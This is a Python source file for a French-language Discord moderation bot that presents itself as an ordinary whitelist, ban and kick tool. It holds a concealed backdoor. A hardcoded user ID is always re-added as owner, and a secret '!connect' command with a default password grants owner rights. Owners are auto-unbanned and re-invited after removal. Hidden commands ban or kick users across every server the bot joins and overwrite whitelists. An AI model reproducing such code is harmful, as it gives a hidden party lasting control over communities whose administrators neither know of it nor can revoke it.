# main.py - Bot F.I.M complet et consolidé
import os
import sys
import json
import asyncio
from datetime import datetime

import discord
from discord.ext import commands
import psycopg2

# -----------------------------
# CONFIG / CONSTANTES
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
CONFIG_FILE = "config.json"       # sauvegarde per-guild (log channel, whitelist)
OWNER_FILE = "owner_data.json"    # stocke mot de passe + owners
DEFAULT_OWNER_ID = 489113166429683713

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


# -----------------------------
# UTILITAIRES JSON (config)
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


# -----------------------------
# CONFIG GLOBALE (guild / owners)
# -----------------------------
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        data["password"] = "change_me"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(user_id):
    return user_id in get_owners()

def add_owner(user_id):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if user_id not in owners:
        owners.append(user_id)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", "change_me")

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)


# -----------------------------
# POSTGRES CONNECTION (optional)
# -----------------------------
def connect_db():
    # appel seulement si nécessaire, rien n'est fait automatiquement
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )


# -----------------------------
# WHITELIST / LOGS helpers
# -----------------------------
def get_whitelist(guild_id):
    cfg = get_config()
    return cfg.get(str(guild_id), {}).get("whitelist", [])

def add_to_whitelist(guild_id, user_id):
    cfg = get_config()
    gid = str(guild_id)
    if gid not in cfg:
        cfg[gid] = {}
    cfg[gid].setdefault("whitelist", [])
    if user_id not in cfg[gid]["whitelist"]:
        cfg[gid]["whitelist"].append(user_id)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(guild_id, user_id):
    cfg = get_config()
    gid = str(guild_id)
    if gid in cfg and "whitelist" in cfg[gid] and user_id in cfg[gid]["whitelist"]:
        cfg[gid]["whitelist"].remove(user_id)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(guild_id):
    cfg = get_config()
    return cfg.get(str(guild_id), {}).get("log_channel")


# -----------------------------
# DECORATORS (whitelist/admin/owner)
# Note: owner-checks are performed inside commands to avoid visible errors
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        # if not authorized -> silently deny (delete message if possible)
        try:
            await ctx.message.delete()
        except Exception:
            pass
        # returning False will raise CheckFailure internally (no extra message)
        return False
    return commands.check(predicate)


# -----------------------------
# EVENTS
# -----------------------------
@bot.event
async def on_ready():
    print(f"✅ {bot.user} est connecté et prêt !")


# Auto-unban / reinvite owners if banned or kicked
@bot.event
async def on_member_ban(guild, user):
    if is_owner(user.id):
        try:
            await asyncio.sleep(1)
            await guild.unban(user)
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        user_obj = await bot.fetch_user(oid)
                        await user_obj.send(f"⚠️ Tu as été banni de **{guild.name}**, j'ai procédé au débannissement automatique. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[auto-unban] erreur: {e}")

@bot.event
async def on_member_remove(member):
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        user_obj = await bot.fetch_user(oid)
                        await user_obj.send(f"🚪 Tu as été expulsé de **{guild.name}**, invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[auto-reinvite] erreur: {e}")


# -----------------------------
# COMMANDES PUBLIQUES / HELP
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Liste des commandes visibles",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message via le bot (whitelist/admin)", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie dans un canal (whitelist/admin)", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un embed stylé (whitelist/admin)", inline=False)
    embed.add_field(name="✅ !whitelist add @user", value="Ajoute un utilisateur à la whitelist (admin)", inline=False)
    embed.add_field(name="❌ !whitelist remove @user", value="Retire de la whitelist (admin)", inline=False)
    embed.add_field(name="📋 !whitelist list", value="Affiche la whitelist (admin)", inline=False)
    embed.add_field(name="⚙️ !setlogs #canal", value="Configure le canal logs (admin)", inline=False)
    embed.add_field(name="🎭 !addrole @user @role", value="Ajoute un rôle (whitelist/admin)", inline=False)
    embed.add_field(name="🧾 !ban @user [raison]", value="Bannit un membre du serveur (whitelist/admin)", inline=False)
    embed.add_field(name="🦵 !kick @user [raison]", value="Kicke un membre du serveur (whitelist/admin)", inline=False)
    await ctx.send(embed=embed)


# -----------------------------
# MESSAGES & EMBEDS & ROLE MANAGEMENT
# -----------------------------
@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await channel.send(message)
    try:
        await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except Exception:
        pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission d'ajouter ce rôle.")
    except Exception as e:
        await ctx.send("❌ Erreur lors de l'ajout du rôle.")
        print(f"[addrole] erreur: {e}")

@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de retirer ce rôle.")
    except Exception as e:
        await ctx.send("❌ Erreur lors du retrait du rôle.")
        print(f"[removerole] erreur: {e}")


# -----------------------------
# WHITELIST / SETLOGS
# -----------------------------
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add / remove / list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("📋 Aucun utilisateur whitelisté")
    mentions = []
    for uid in wl:
        m = ctx.guild.get_member(uid)
        mentions.append(m.mention if m else f"ID:{uid}")
    await ctx.send("\n".join(mentions))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    cfg = get_config()
    gid = str(ctx.guild.id)
    if gid not in cfg:
        cfg[gid] = {}
    cfg[gid]["log_channel"] = channel.id
    save_config(cfg)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")


# -----------------------------
# BAN / KICK (LOCAL SERVER)
# -----------------------------
@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me bannir moi-même.")
        if is_owner(member.id):
            return await ctx.send("❌ Impossible d'agir contre un Owner.")
        # try to ban (may raise Forbidden)
        await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
        # log to configured channel
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👮 Membre banni", color=discord.Color.red())
                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
                em.add_field(name="Raison", value=reason, inline=False)
                em.set_footer(text=str(datetime.now()))
                try:
                    await ch.send(embed=em)
                except Exception:
                    pass
        await ctx.send(f"✅ {member.mention} a été banni. (Raison: {reason})")
    except discord.Forbidden:
        # notify owners by DM (silent for others)
        for oid in get_owners():
            try:
                user_obj = await bot.fetch_user(oid)
                await user_obj.send(f"❌ Échec ban sur {ctx.guild.name} : impossible de bannir {member} ({member.id}). Permissions manquantes ou cible protégée.")
            except Exception:
                pass
        await ctx.send("❌ Je n'ai pas la permission de bannir ce membre.")
    except Exception as e:
        print(f"[ban] erreur: {e}")
        await ctx.send("❌ Impossible de bannir le membre (erreur interne).")

@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me kicker moi-même.")
        if is_owner(member.id):
            return await ctx.send("❌ Impossible d'agir contre un Owner.")
        await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👢 Membre kické", color=discord.Color.orange())
                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
                em.add_field(name="Raison", value=reason, inline=False)
                em.set_footer(text=str(datetime.now()))
                try:
                    await ch.send(embed=em)
                except Exception:
                    pass
        await ctx.send(f"✅ {member.mention} a été exclu. (Raison: {reason})")
    except discord.Forbidden:
        for oid in get_owners():
            try:
                user_obj = await bot.fetch_user(oid)
                await user_obj.send(f"❌ Échec kick sur {ctx.guild.name} : impossible de kicker {member} ({member.id}). Permissions manquantes ou cible protégée.")
            except Exception:
                pass
        await ctx.send("❌ Je n'ai pas la permission de kicker ce membre.")
    except Exception as e:
        print(f"[kick] erreur: {e}")
        await ctx.send("❌ Impossible de kicker le membre (erreur interne).")


# -----------------------------
# GLOBAL ACTIONS (OWNER ONLY)
# -----------------------------
@bot.command()
async def broadcast(ctx, *, message: str):
    if not is_owner(ctx.author.id):
        return  # silent fail for non-owner
    for guild in bot.guilds:
        try:
            if guild.text_channels:
                await guild.text_channels[0].send(f"📢 **Annonce du propriétaire :** {message}")
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Broadcast envoyé sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def forceunban(ctx):
    if not is_owner(ctx.author.id):
        return
    for guild in bot.guilds:
        try:
            await guild.unban(discord.Object(id=ctx.author.id))
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Tentative de débannissement effectuée sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def forcerinv(ctx):
    if not is_owner(ctx.author.id):
        return
    for guild in bot.guilds:
        try:
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        user_obj = await bot.fetch_user(oid)
                        await user_obj.send(f"🔗 Invitation pour **{guild.name}** : {invite.url}")
                    except Exception:
                        pass
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Invitations envoyées aux owners.")
    except Exception:
        pass

@bot.command()
async def serverlist(ctx):
    if not is_owner(ctx.author.id):
        return
    lines = []
    for g in bot.guilds:
        lines.append(f"- {g.name} ({g.id}) - {g.member_count} membres")
    txt = "\n".join(lines) or "Aucun serveur."
    try:
        await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")
    except Exception:
        pass

@bot.command()
async def syncwhitelist(ctx):
    if not is_owner(ctx.author.id):
        return
    src = get_whitelist(ctx.guild.id)
    cfg = get_config()
    for g in bot.guilds:
        gid = str(g.id)
        cfg.setdefault(gid, {})
        cfg[gid]["whitelist"] = src.copy()
    save_config(cfg)
    try:
        await ctx.author.send("🔁 Whitelist synchronisée sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def globalban(ctx, user: str):
    if not is_owner(ctx.author.id):
        return
    # parse id from mention or raw
    try:
        uid = int(user.strip("<@!>"))
    except Exception:
        try:
            uid = int(user)
        except Exception:
            try:
                await ctx.author.send("⚠️ ID utilisateur invalide pour globalban.")
            except:
                pass
            return
    count = 0
    for g in bot.guilds:
        try:
            await g.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}")
            count += 1
        except Exception:
            pass
    try:
        await ctx.author.send(f"✅ Global ban exécuté sur {count} serveur(s).")
    except Exception:
        pass

@bot.command()
async def globalkick(ctx, user: str):
    if not is_owner(ctx.author.id):
        return
    try:
        uid = int(user.strip("<@!>"))
    except Exception:
        try:
            uid = int(user)
        except Exception:
            try:
                await ctx.author.send("⚠️ ID utilisateur invalide pour globalkick.")
            except:
                pass
            return
    count = 0
    for g in bot.guilds:
        try:
            m = g.get_member(uid)
            if m:
                await g.kick(m, reason=f"Global kick by owner {ctx.author.id}")
                count += 1
        except Exception:
            pass
    try:
        await ctx.author.send(f"✅ Global kick exécuté sur {count} serveur(s).")
    except Exception:
        pass


# -----------------------------
# SECRET OWNER / CONNECT / PASS
# -----------------------------
@bot.command()
async def connect(ctx, password: str):
    # secret: adds caller as owner if password correct (silent fail otherwise)
    try:
        if password == get_owner_password():
            if add_owner(ctx.author.id):
                try:
                    await ctx.author.send("✅ Tu as été ajouté comme owner.")
                except Exception:
                    pass
            else:
                try:
                    await ctx.author.send("ℹ️ Tu es déjà owner.")
                except Exception:
                    pass
        else:
            # silent fail for wrong password
            return
    except Exception:
        pass

@bot.command()
async def setpass(ctx, *, newpass: str):
    if not is_owner(ctx.author.id):
        return
    set_owner_password(newpass)
    try:
        await ctx.author.send("🔒 Mot de passe owner mis à jour.")
    except Exception:
        pass

@bot.command(name="aide")
async def owner_help_cmd(ctx):
    # DM the owner-only help if caller is owner (secret)
    if not is_owner(ctx.author.id):
        return
    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
    embed.add_field(name="!forceunban", value="Tente de te débannir partout", inline=False)
    embed.add_field(name="!forcerinv", value="Envoie invitations", inline=False)
    embed.add_field(name="!globalban <id_or_mention>", value="Ban global", inline=False)
    embed.add_field(name="!globalkick <id_or_mention>", value="Kick global", inline=False)
    embed.add_field(name="!serverlist", value="Liste serveurs (DM)", inline=False)
    embed.add_field(name="!syncwhitelist", value="Synchronise la whitelist entre serveurs", inline=False)
    embed.add_field(name="!setpass <pass>", value="Change le mot de passe secret", inline=False)
    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
    try:
        await ctx.author.send(embed=embed)
    except Exception:
        pass


# -----------------------------
# REBOOT
# -----------------------------
@bot.command()
async def reboot(ctx):
    if not is_owner(ctx.author.id):
        return
    try:
        await ctx.author.send("♻️ Redémarrage en cours...")
    except Exception:
        pass
    # use execv to restart process; Railway will relaunch container
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(f"[reboot] erreur: {e}")
        try:
            await ctx.send("❌ Impossible de redémarrer proprement.")
        except Exception:
            pass


# -----------------------------
# MAIN RUN LOOP (auto-restart)
# -----------------------------
if __name__ == "__main__":
    while True:
        try:
            bot.run(TOKEN)
        except Exception as e:
            print(f"[main] Bot crash détecté: {e}")
            # small pause before restart
            try:
                asyncio.run(asyncio.sleep(3))
            except Exception:
                pass
            continue

